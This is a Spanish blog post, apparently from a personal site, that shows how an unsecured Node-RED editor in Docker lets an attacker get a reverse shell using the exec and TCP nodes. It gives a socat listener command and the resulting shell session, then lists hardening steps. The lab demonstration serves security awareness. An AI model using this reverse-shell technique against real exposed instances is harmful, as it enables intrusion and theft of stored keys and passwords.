@@ -1,0 +1,110 @@
+---
+title: '¿Por qué deberías proteger Node-RED?'
+date: '2023-01-15'
+tags: []
+draft: false
+authors: ['default']
+summary: '![](/static/images/uploads/por-que-deberias-proteger-node-red/nodered-pwned.webp)'
+---
+
+![](/static/images/uploads/por-que-deberias-proteger-node-red/nodered-pwned.webp)
+
+¿Qué es Node-RED?
+-----------------
+
+Esta es la parte más aburrida del post, por lo que me voy a permitir el lujo de copiarlo de otro sitio en Internet.
+
+
+ Node-RED es una herramienta de **programación visual que se implementa en dispositivos controladores de *hardware*****.** Trabaja mostrando de manera visual las relaciones y funciones de manera que se pueda programar sin escribir. Es un **panel** de ***flow*** al que se pueden incorporar nodos que se comuniquen entre ellos y puede instalarse en equipos como ordenadores Windows, Linux, o en servidores en la nube. Este sistema de representaciónpuede ayudarte a visualizar gráficamente el flujo de la información y consiste en su representación gráfica.
+
+En otras palabras, es una plataforma que mediante cajitas que hacen distintas cosas, eres capaz de crear un **workflow** de una forma visual y ver su representación de un solo vistazo.
+
+Preparación del escenario
+-------------------------
+
+1. Arranco **Docker** en mi ordenador de casa con **Windows 11**.
+
+
+```
+@ikero ➜ ~ docker run -it -p 1880:1880 -v node_red_data:/data --name mynodered nodered/node-red
+```
+2. Mapeo el puerto *1880* del contenedor al *1880* de **Windows**, para que sea visible por otros equipos.
+
+3. Confirmo que el contenedor está funcionando correctamente y podemos empezar con la prueba de concepto.
+
+![](/static/images/uploads/por-que-deberias-proteger-node-red/image-4.webp)
+
+⚠️Esta prueba se realiza utilizando contenedores Docker, pero es también posible hacerlo sin utilizar ninguna tecnología de contenedorización.De qué forma es vulnerable
+--------------------------
+
+Arranco una máquina virtual de tal forma que simularemos ser el atacante de la prueba. El esquema es el siguiente.
+
+![](/static/images/uploads/por-que-deberias-proteger-node-red/nodered-esquema-2.svg)
+
+Mi máquina virtual es capaz de acceder al puerto *1880* del PC con *Windows 11* corriendo el contenedor de **Node-RED**.
+
+![](/static/images/uploads/por-que-deberias-proteger-node-red/image-3.webp)
+
+Los nodos de los cuales voy a sacar provecho son los siguientes:
+
+* **exec**: Ejecuta un comando de sistema y devuelve su salida.
+* **tcp in**: Provee una muestra de acciones de entrada por TCP.
+* **tcp out**: Provee una muestra de acciones de salida por TCP.
+
+Son solamente necesarios estos tres nodos para comprometer el sistema. El siguiente flujo entabla una **shell reversa** por el puerto *9999*
+
+![](/static/images/uploads/por-que-deberias-proteger-node-red/image-5.webp)
+
+Me pongo en escucha desde la máquina atacante con la IP 192.168.1.138 y veamos que ocurre.
+
+
+```
+sudo socat -d -d TCP-LISTEN:9999 STDOUT
+# 2023/01/15 02:57:47 socat[64557] W ioctl(5, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device
+# 2023/01/15 02:57:47 socat[64557] N listening on AF=2 0.0.0.0:9999
+# 2023/01/15 02:57:56 socat[64557] N accepting connection from AF=2 192.168.1.132:64267 on AF=2 192.168.1.138:9999
+# 2023/01/15 02:57:56 socat[64557] N using stdout for reading and writing
+# 2023/01/15 02:57:56 socat[64557] N starting data transfer loop with FDs [6,6] and [1,1]
+whoami
+# node-red
+ls /
+# bin
+# data
+# dev
+# etc
+# healthcheck.js
+# home
+# lib
+# media
+# mnt
+# opt
+# proc
+# root
+# run
+# sbin
+# srv
+# sys
+# tmp
+# usr
+# var
+```
+Ya tenemos acceso a la Shell del contenedor Docker. No debemos pensar bajo ningún concepto que por el hecho de usar contenedores ya estamos protegidos. Existen varias vulnerabilidades de tipo [Container Escape Vulnerability](https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities) que hace que no debamos bajar la guardia simplemente por el hecho de usar contenedores.
+
+A partir de aquí, debes pensar que cualquier cosa que estuviese dentro de tu sistema (o en otros sistemas, porque también se puede acabar saltando hacia otros equipos vulnerables del entorno) ha podido ser robada. Ya sean **Api Keys** que utilizas para subir los datos a un proveedor **Cloud** o contraseñas para acceder a otros sistemas que hayas pensado que almacenarlos dentro de una carpeta del contenedor era una buena idea.
+
+Cómo puedo hacerlo (un poco) más seguro.
+----------------------------------------
+
+Lo primero es seguir las recomendaciones que dice su propia página en https://nodered.org/docs/user-guide/runtime/securing-node-red.
+
+En la primera línea nos encontramos el siguiente mensaje.
+
+⚠️By default, the Node-RED editor is not secured - anyone who can access its IP address can access the editor and deploy changes.A partir de aquí, lo que debe ser un **MUST** en nuestra configuración debe ser:
+
+* Habilitar la ventana de Login en todos los casos.
+* Separar credenciales entre los editores de los flujos y los usuarios normales.
+* Habilitar HTTPs. Aunque sea con certificados autofirmados.
+* Deshabilitar aquellos nodos que creamos que no son necesarios para nuestro tipo de trabajo. O mejor aún, deshabilitar todos y habilitar SOLO aquellos que son necesarios.
+
+Los flujos de Node-RED son, al fin y al cabo, una manera de desarrollar software "más sencilla". El hecho de ver una interfaz amigable no debe despistarnos de lo que es la plataforma en sí. Abrir la puerta a que cualquiera pueda desarrollar sus flujos sin ningún tipo de cuidado, puede ser peligroso.
+
